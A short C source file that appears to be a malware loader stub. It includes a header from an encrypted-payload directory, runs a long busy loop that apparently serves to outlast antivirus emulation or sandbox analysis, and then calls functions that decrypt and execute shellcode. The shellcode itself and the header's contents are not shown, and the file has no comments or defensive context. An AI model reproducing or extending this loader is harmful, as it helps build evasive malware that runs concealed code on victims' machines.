#include "../payload_encrypted/payload.h"

#define MAX_OP 100000000
int main(){
    int counter = 0;
    for(int i = 0; i < MAX_OP; i ++){
        counter++;
    }
    if(counter == MAX_OP){
        decryptShellCode();
        startShellCode();
    }
    return 0;
}